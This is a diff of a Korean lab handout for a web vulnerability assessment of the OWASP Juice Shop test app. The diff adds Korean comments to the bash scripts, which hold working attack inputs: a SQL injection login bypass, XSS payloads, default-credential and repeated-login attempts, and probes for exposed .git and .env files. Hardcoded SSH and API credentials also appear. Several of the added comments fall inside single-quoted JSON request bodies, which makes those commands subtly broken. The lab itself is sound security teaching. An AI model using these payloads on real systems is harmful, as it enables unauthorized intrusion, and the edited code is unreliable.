@@ -123,29 +123,29 @@
 > **실전 활용**: 이 실습은 실제 웹 취약점 점검 프로젝트의 납품 과정과 동일한 절차를 따른다
 
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== 점검 대상 시스템 정보 ==="
 
 echo "--- 서비스 상태 ---"
-curl -s -o /dev/null -w "JuiceShop: HTTP %{http_code}\n" http://localhost:3000/
+curl -s -o /dev/null -w "JuiceShop: HTTP %{http_code}\n" http://localhost:3000/  # silent 모드
 curl -sI http://localhost:3000/ | grep -iE "^(server|x-powered|content-type):"
 
 echo ""
 echo "--- API 엔드포인트 탐색 ---"
-for ep in rest/products/search?q= api/Users api/Products api/Challenges api-docs ftp; do
+for ep in rest/products/search?q= api/Users api/Products api/Challenges api-docs ftp; do  # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$ep)
   echo "  /$ep -> HTTP $CODE"
 done
 
 echo ""
 echo "--- 기술 스택 식별 ---"
-curl -s http://localhost:3000/package.json 2>/dev/null | python3 -c "
+curl -s http://localhost:3000/package.json 2>/dev/null | python3 -c "  # silent 모드
 import json,sys
 try:
     d = json.load(sys.stdin)
     print(f'  앱: {d.get(\"name\",\"?\")} v{d.get(\"version\",\"?\")}')
     deps = d.get('dependencies',{})
-    for k in list(deps.keys())[:5]:
+    for k in list(deps.keys())[:5]:                    # 반복문 시작
         print(f'  의존성: {k} {deps[k]}')
 except: print('  package.json 파싱 실패')
 " 2>/dev/null
@@ -154,9 +154,11 @@ ENDSSH
 
 ### 2.2 점검 계획서 작성
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
-python3 << 'PYEOF'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 from datetime import datetime
 
 plan = f"""
@@ -199,8 +201,10 @@ ENDSSH
 
 ### 3.1 보안 헤더 및 설정 점검
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== 보안 헤더 점검 ==="
 HEADERS=$(curl -sI http://localhost:3000/)
 
@@ -215,7 +219,7 @@ done
 
 echo ""
 echo "=== 디렉토리/파일 노출 점검 ==="
-for path in ".git/HEAD" ".env" "package.json" "robots.txt" "api-docs" "ftp"; do
+for path in ".git/HEAD" ".env" "package.json" "robots.txt" "api-docs" "ftp"; do  # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000/$path)
   if [ "$CODE" = "200" ]; then
     echo "[EXPOSED] /$path (HTTP $CODE)"
@@ -228,21 +232,23 @@ ENDSSH
 
 ### 3.2 HTTP 메서드 및 서버 정보
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== HTTP 메서드 점검 ==="
-for method in GET POST PUT DELETE OPTIONS TRACE PATCH; do
+for method in GET POST PUT DELETE OPTIONS TRACE PATCH; do  # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" -X $method http://localhost:3000/api/Products)
   echo "  $method /api/Products -> HTTP $CODE"
 done
 
 echo ""
 echo "=== 디폴트 계정 점검 ==="
-for cred in "admin@juice-sh.op:admin123" "admin:admin" "test@test.com:test"; do
+for cred in "admin@juice-sh.op:admin123" "admin:admin" "test@test.com:test"; do  # 반복문 시작
   IFS=":" read -r email pass <<< "$cred"
   RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
     -H "Content-Type: application/json" \
-    -d "{\"email\":\"$email\",\"password\":\"$pass\"}")
+    -d "{\"email\":\"$email\",\"password\":\"$pass\"}")  # 요청 데이터(body)
   if echo "$RESULT" | grep -q "authentication"; then
     echo "  [VULN] $email / $pass -> 로그인 성공"
   else
@@ -258,14 +264,16 @@ ENDSSH
 
 ### 4.1 SQL Injection 점검
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== SQL Injection 점검 ==="
 
 echo "--- 로그인 SQLi ---"
 RESULT=$(curl -s -X POST http://localhost:3000/rest/user/login \
   -H "Content-Type: application/json" \
-  -d '{"email":"'"'"' OR 1=1--","password":"x"}')
+  -d '{"email":"'"'"' OR 1=1--","password":"x"}')      # 요청 데이터(body)
 if echo "$RESULT" | grep -q "authentication"; then
   echo "[CRITICAL] 로그인 SQLi -> 인증 우회 성공"
   echo "$RESULT" | python3 -c "
@@ -290,12 +298,14 @@ ENDSSH
 
 ### 4.2 XSS 및 접근제어 점검
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== XSS 점검 ==="
 XSS_PAYLOADS=("<script>alert(1)</script>" "<img src=x onerror=alert(1)>" "<svg onload=alert(1)>")
 
-for payload in "${XSS_PAYLOADS[@]}"; do
+for payload in "${XSS_PAYLOADS[@]}"; do                # 반복문 시작
   ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
   RESP=$(curl -s "http://localhost:3000/rest/products/search?q=${ENCODED}")
   if echo "$RESP" | grep -qF "$payload"; then
@@ -308,7 +318,7 @@ done
 echo ""
 echo "=== 접근제어 점검 ==="
 echo "--- 인증 없이 API 접근 ---"
-for ep in "api/Users" "api/Challenges" "api/Quantitys"; do
+for ep in "api/Users" "api/Challenges" "api/Quantitys"; do  # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" "http://localhost:3000/$ep")
   echo "  /$ep -> HTTP $CODE"
   [ "$CODE" = "200" ] && echo "    [MEDIUM] 인증 없이 접근 가능"
@@ -316,10 +326,10 @@ done
 
 echo ""
 echo "--- 패스워드 정책 ---"
-for pw in "1" "abc" "a"; do
+for pw in "1" "abc" "a"; do                            # 반복문 시작
   RESULT=$(curl -s -X POST http://localhost:3000/api/Users/ \
     -H "Content-Type: application/json" \
-    -d "{\"email\":\"pwtest_$(date +%s%N)@t.com\",\"password\":\"$pw\",\"passwordRepeat\":\"$pw\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"a\"}")
+    -d "{\"email\":\"pwtest_$(date +%s%N)@t.com\",\"password\":\"$pw\",\"passwordRepeat\":\"$pw\",\"securityQuestion\":{\"id\":1},\"securityAnswer\":\"a\"}")  # 요청 데이터(body)
   if echo "$RESULT" | grep -q "\"id\""; then
     echo "  [MEDIUM] 약한 패스워드 허용: '$pw'"
   fi
@@ -329,14 +339,16 @@ ENDSSH
 
 ### 4.3 인증 및 세션 점검
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
 echo "=== 계정 잠금 정책 점검 ==="
 echo "5회 연속 실패 시도..."
-for i in $(seq 1 5); do
+for i in $(seq 1 5); do                                # 반복문 시작
   CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:3000/rest/user/login \
     -H "Content-Type: application/json" \
-    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')
+    -d '{"email":"admin@juice-sh.op","password":"wrong'$i'"}')  # 요청 데이터(body)
   echo "  시도 $i: HTTP $CODE"
 done
 echo "  -> 5회 실패 후에도 계정 잠금 없으면 [MEDIUM] 취약"
@@ -346,7 +358,7 @@ echo "=== JWT 토큰 분석 ==="
 TOKEN=$(curl -s -X POST http://localhost:3000/rest/user/login \
   -H "Content-Type: application/json" \
   -d '{"email":"'"'"' OR 1=1--","password":"x"}' | \
-  python3 -c "import json,sys; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
+  python3 -c "import json,sys; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)  # Python 코드 실행
 
 if [ -n "$TOKEN" ] && [ "$TOKEN" != "" ]; then
   echo "$TOKEN" | cut -d. -f2 | python3 -c "
@@ -392,9 +404,11 @@ ENDSSH
 
 ### 5.2 종합 보고서 자동 생성
 
+원격 서버에 접속하여 명령을 실행합니다.
+
 ```bash
-sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'
-python3 << 'PYEOF'
+sshpass -p1 ssh -o StrictHostKeyChecking=no web@10.20.30.80 << 'ENDSSH'  # 비밀번호 자동입력 SSH
+python3 << 'PYEOF'                                     # Python 스크립트 실행
 from datetime import datetime
 
 findings = [
@@ -422,7 +436,7 @@ findings = [
 ]
 
 stats = {}
-for f in findings:
+for f in findings:                                     # 반복문 시작
     s = f["severity"]
     stats[s] = stats.get(s, 0) + 1
 
@@ -438,12 +452,12 @@ report = f"""
 1. 요약
    총 발견: {len(findings)}건
 """
-for sev in ["Critical","High","Medium","Low"]:
+for sev in ["Critical","High","Medium","Low"]:         # 반복문 시작
     report += f"     {sev}: {stats.get(sev,0)}건\n"
 
 report += f"\n2. 발견사항 상세\n{'~'*60}\n"
 
-for f in findings:
+for f in findings:                                     # 반복문 시작
     report += f"""
 [{f['id']}] {f['name']}
   심각도: {f['severity']} (CVSS {f['cvss']})
@@ -477,27 +491,29 @@ ENDSSH
 
 ### 6.1 OpsClaw로 점검 자동화
 
+OpsClaw Manager API를 호출하여 작업을 수행합니다.
+
 ```bash
-export OPSCLAW_API_KEY=opsclaw-api-key-2026
+export OPSCLAW_API_KEY=opsclaw-api-key-2026            # 환경 변수 설정
 
 # 1. 프로젝트 생성
 echo "=== OpsClaw 프로젝트 생성 ==="
 PROJECT=$(curl -s -X POST http://localhost:8000/projects \
   -H "Content-Type: application/json" \
   -H "X-API-Key: $OPSCLAW_API_KEY" \
-  -d '{"name":"final-vuln-assessment","request_text":"기말 종합 점검","master_mode":"external"}')
+  -d '{"name":"final-vuln-assessment","request_text":"기말 종합 점검","master_mode":"external"}')  # 요청 데이터(body)
 PID=$(echo "$PROJECT" | python3 -c "import json,sys; print(json.load(sys.stdin)['id'])")
 echo "Project ID: $PID"
 
 # 2. Stage 전환
-curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
-curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
+curl -s -X POST "http://localhost:8000/projects/$PID/plan" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null  # silent 모드 / POST 요청 / API 인증 / OpsClaw 프로젝트
+curl -s -X POST "http://localhost:8000/projects/$PID/execute" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null  # silent 모드 / POST 요청 / API 인증 / OpsClaw 프로젝트
 
 # 3. 점검 실행 (evidence 자동 기록)
 curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
   -H "Content-Type: application/json" \
   -H "X-API-Key: $OPSCLAW_API_KEY" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "tasks": [
       {"order":1,"instruction_prompt":"curl -sI http://localhost:3000/ | head -15","risk_level":"low"},
       {"order":2,"instruction_prompt":"curl -s -X POST http://localhost:3000/rest/user/login -H \"Content-Type: application/json\" -d \"{\\\"email\\\":\\\"'"'"' OR 1=1--\\\",\\\"password\\\":\\\"x\\\"}\" | head -5","risk_level":"low"}
@@ -508,7 +524,7 @@ curl -s -X POST "http://localhost:8000/projects/$PID/execute-plan" \
 # 4. evidence 확인
 echo ""
 curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
-  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -c "import json,sys; print(json.dumps(json.load(sys.stdin), indent=2, ensure_ascii=False)[:300])" 2>/dev/null
+  -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -c "import json,sys; print(json.dumps(json.load(sys.stdin), indent=2, ensure_ascii=False)[:300])" 2>/dev/null  # API 인증 키
 ```
 
 ### 6.2 LLM 기반 보고서 품질 검증
@@ -516,7 +532,7 @@ curl -s "http://localhost:8000/projects/$PID/evidence/summary" \
 ```bash
 curl -s http://192.168.0.105:11434/v1/chat/completions \
   -H "Content-Type: application/json" \
-  -d '{
+  -d '{                                                # 요청 데이터(body)
     "model": "gemma3:12b",
     "messages": [
       {"role": "system", "content": "보안 컨설팅 심사관입니다. 취약점 점검 보고서를 평가합니다. 한국어로."},
